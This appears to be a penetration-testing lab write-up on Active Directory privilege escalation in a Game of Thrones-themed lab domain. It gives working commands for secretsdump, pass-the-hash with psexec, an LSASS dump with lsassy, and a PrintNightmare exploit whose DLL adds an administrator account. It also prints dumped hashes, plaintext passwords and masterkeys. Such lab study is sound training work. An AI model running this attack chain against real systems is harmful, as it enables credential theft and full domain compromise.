# 4. Privilege Escalation

## 4.1 Secrets Dump

Since I got one user credentials for Winterfell which is `robb.stark:sexywolfy`, let's try to connect to it via rpcclient.

`rpcclient -U 'robb.stark%sexywolfy' 10.4.10.11`

By running `enumdomusers` I get the list of users:

![Pasted_image_20250107135937](https://github.com/user-attachments/assets/1d53e4bf-1791-4918-9ab7-a909503794f8)

Then I get the list of groups by running `enumdomgroups`:

![Pasted_image_20250107140035](https://github.com/user-attachments/assets/e16c66bf-f4a9-4bce-9ce6-4f32a423f49c)

Now, since I want to get the members of the Domain Admins, i use `qureygroupmem 0x200`:

![Pasted_image_20250107140129](https://github.com/user-attachments/assets/76aa0b9e-16f1-448c-bed3-c2cd7711aaaf)

Here I see the `rid-s` of the members of Domain Admin group, which are `0x1f4` and `0x457`, and by looking at the users I can conclude that the members of this admin group are:

`user:[Administrator] rid:[0x1f4]`
`user:[eddard.stark] rid:[0x457]`

Now, let's get the hashes, by using `secretsdump.py`, and running:

```bash
secretsdump.py north.sevenkingdoms.local/robb.stark:sexywolfy@10.4.10.11
```

I got:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:34b24f1a67d914d8ef876f8bd02f3f0b:::
localuser:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::
brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:8a647d60877c8743dccb8ff2aa18a060:::
CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:0073abf6ce521277f2d1a148bc955aa9:::
SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:ac819f7c593d51f56b614f3dcc10f193:::
```

## 4.2 Pass-the-Hash

Then by using `Pass the Hash` I use this hash to authenticate as the Domain Admin, using the `psexec.py` tool from `impacket`:

`psexec.py north.sevenkingdoms.local/eddard.stark@10.4.10.11 -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8`

![Pasted_image_20250107141138](https://github.com/user-attachments/assets/53440b38-091b-4885-9587-a2078373621d)

## 4.3 LSASS Dump

LSASS (Local Security Authority Subsystem Service) is a process which enforces security policy on the system and handles authentication requests, user session management, and other security-related tasks.

Functions of LSASS:
- Authentication Management - Processes login requests for local and domain accounts, and validates user credentials (passwords, NTLM hashes, Kerberos tickets).
- Access Token Creation - After authentication is successful, it creates and assigns an access token to the user or process, defining what resources they can access.
- Kerberos and NTLM Authentication.
- Security Policy Enforcing - Enforces account lockout policies, password requirements and privilege assignments.

I dumped the LSASS memory by using the `lsassy` tool, and passing the hash of "eddard.stark".

`lsassy -u eddard.stark -p "" -H d977b98c6c9282c5c478be1d97b237b8 -d north.sevenkingdoms.local 10.4.10.22`

I dumped the following sensitive information from LSASS Memory:

**NTLM and SHA1 Hashes:**

`10.4.10.22 - NORTH\CASTELBLACK$                               [NT] 0073abf6ce521277f2d1a148bc955aa9 | [SHA1] 057ab9db09f89ca2659dcffccbbbf363e896d5af`

`10.4.10.22 - NORTH\robb.stark                                 [NT] 831486ac7f26860c9e2f51ac91e1a07a | [SHA1] 3bea28f1c440eed7be7d423cefebb50322ed7b6c`

`10.4.10.22 - NORTH\sql_svc                                    [NT] 84a5092f53390ea48d660be52b93b804 | [SHA1] 9fd961155e28b1c6f9b3859f32f4779ad6a06404`

`10.4.10.22 - NORTH\jon.snow                                   [NT] b8d76e56e9dac90539aff05e3ccb1755 | [SHA1] 1315aeb7efe3eed73b568094db32a90f2e24a248`

`10.4.10.22 - CASTELBLACK\localuser                            [NT] 8846f7eaee8fb117ad06bdd830b7586c | [SHA1] e8f97fba9104d1ea5047948e6dfb67facd9f5b73`

**Plaintext Passwords**

`10.4.10.22 - north.sevenkingdoms.local\CASTELBLACK$           [PWD] wGC870k%/[bHDQHK$eg;5h$>4&t[NygJP]l16jqa?!CaL69P]!=%xk7@qkdZYk&J"61OyMAL+n=6UqSh]kIh:t7spo\t;KNWl>FtN\i<E=VYxG#5hG?mhN(b`

`10.4.10.22 - NORTH.SEVENKINGDOMS.LOCAL\sql_svc                [PWD] YouWillNotKerboroast1ngMeeeeee`

 **Kerberos Tickets**
`TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_77ebdaad_20250108035512.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_936064ee_20250108035512.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_cd6de780_20250108072401.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_d64496a2_20250108072401.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_jon.snow_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_cbdc1708_20250108011355.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_jon.snow_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_d6b61eec_20250108011355.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_63d16d9f_20250108071403.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_ff508b0c_20250108071403.kirbi`

 **Masterkeys**

```
{3d4f266a-de48-4dfb-9c6a-66199d459c70}:653eb6c7703e25902ed8155e7155c143cbfdc1c0
{33bfcf95-1f92-4e5e-b6a7-9cb352a2f974}:06d70e6e1288db973a8c9c90068dbed7a619f357
{83cc6bf8-de96-4c69-9873-fa92c33d7472}:3b7ae371d4d1bcb30079333710352f8dbd447a8c
{c824016c-86f8-40d7-80b9-8b8cb456dffd}:05815587d7906ebd6a7704bc859a9b9c7af666f2
{dadb3c63-2a33-4d51-a5a9-195d30522492}:66f6ad8f61a8bf24e5d1531750ec8b6c465b31a6
{df4fb521-2ef6-466b-b985-ba986c151ace}:d5386dd8bb8ceb3a1b7c059a896d71f3ced221ad
{4d72c6d2-f696-4db2-a537-d87f70307e10}:17ec2cd5ac955dacf1b59054f7686e3cf8f28238
{3d4f266a-de48-4dfb-9c6a-66199d459c70}:653eb6c7703e25902ed8155e7155c143cbfdc1c0
{33bfcf95-1f92-4e5e-b6a7-9cb352a2f974}:06d70e6e1288db973a8c9c90068dbed7a619f357
{83cc6bf8-de96-4c69-9873-fa92c33d7472}:3b7ae371d4d1bcb30079333710352f8dbd447a8c
{c824016c-86f8-40d7-80b9-8b8cb456dffd}:05815587d7906ebd6a7704bc859a9b9c7af666f2
{dadb3c63-2a33-4d51-a5a9-195d30522492}:66f6ad8f61a8bf24e5d1531750ec8b6c465b31a6
{df4fb521-2ef6-466b-b985-ba986c151ace}:d5386dd8bb8ceb3a1b7c059a896d71f3ced221ad
{4d72c6d2-f696-4db2-a537-d87f70307e10}:17ec2cd5ac955dacf1b59054f7686e3cf8f28238
{3d4f266a-de48-4dfb-9c6a-66199d459c70}:653eb6c7703e25902ed8155e7155c143cbfdc1c0
{33bfcf95-1f92-4e5e-b6a7-9cb352a2f974}:06d70e6e1288db973a8c9c90068dbed7a619f357
{83cc6bf8-de96-4c69-9873-fa92c33d7472}:3b7ae371d4d1bcb30079333710352f8dbd447a8c
{c824016c-86f8-40d7-80b9-8b8cb456dffd}:05815587d7906ebd6a7704bc859a9b9c7af666f2
{dadb3c63-2a33-4d51-a5a9-195d30522492}:66f6ad8f61a8bf24e5d1531750ec8b6c465b31a6
{df4fb521-2ef6-466b-b985-ba986c151ace}:d5386dd8bb8ceb3a1b7c059a896d71f3ced221ad
{4d72c6d2-f696-4db2-a537-d87f70307e10}:17ec2cd5ac955dacf1b59054f7686e3cf8f28238
```

## 4.4 PrintNightMare Exploit

In this attack I will target the Print Spooler Service.

Print Spooler is a service in Windows that manages print jobs, stores them in a queue and sends them to the printer for processing, and handles the installation and management of printer drivers.

**PrintNightmare** is a vulnerability that uses the ability of the **Print Spooler** to allow non-administrative users to install arbitrary printer drivers, which can contain malicious code. Normally installing a printer driver should require administrative privileges, but this vulnerability bypasses this vulnerability.

**CVE-2021-34527** is a vulnerability that allows attackers to exploit the Print Spooler remotely. If this service is running on a system that is exposed to the network (a server or a DC), an attacker can send specially crafted requests to the service. This can result in the installation of a malicious driver, which allows the attacker to gain full access to the system.

Let's check if the spooler is active:

```bash
crackmapexec smb 10.4.10.10-23 -M spooler
```

And I can see that it is available in all hosts:

<img width="1273" alt="Pasted_image_20241230153144" src="https://github.com/user-attachments/assets/1990dd01-f790-4121-b9eb-b3b7af8c7ad7" />

Preparing the DLL:

In the file below, there is a RunCMD function which using the system function adds a user account **halilPrintNightmare** with the password **halilWasHere.**

Then it adds this user to the **Administrators** group, which grants administrative privileges. 

This function is called when the DLL is loaded (DLL_Process_ATTACH), which is inside the DllMain function which acts as the entry point for the DLL.

<img width="752" alt="Pasted_image_20241230153948" src="https://github.com/user-attachments/assets/f94c761b-3d61-49f5-99b0-4dc5a1689daf" />

Then I will compile it by using the **x86_64-w64-mingw32-gcc**.
```bash
x86_64-w64-mingw32-gcc -shared -o halilPrintNightmare.dll printNightmare.c
```

This will create a .dll file, and now let's set up an SMB server on the location where .dll file is:

```bash
smbserver.py -smb2support ATTACKERSHARE .
```

Then I need to clone the CVE-2021-1675 exploit.

```bash
git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare 
```

Let's try this exploit on the old unpatched server on `Meereen`:

```bash
python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.1\ATTACKERSHARE\nightmare.dll'
```

For this I used the Jorah Mormont credentials, and the result is:

![Pasted_image_20250106185538](https://github.com/user-attachments/assets/e68c34e2-0f0c-4a38-9d6b-f14f3ec6c12d)

Now, I can confirm that the exploit worked in the `Meereen` as I can see the new user there `halilPrintNightmare`.

![](Pasted_image_20241230164921.png)
<img width="752" alt="Pasted_image_20241230164921" src="https://github.com/user-attachments/assets/1e54994b-d475-4aa4-b522-600f676441a8" />

The `DLL-s` can be found also on `C:\Windows\System32\spool\drivers\x64\3`

![Pasted_image_20250106185931](https://github.com/user-attachments/assets/f3fa67b6-00cc-46c6-841e-ffadd739b7c4)

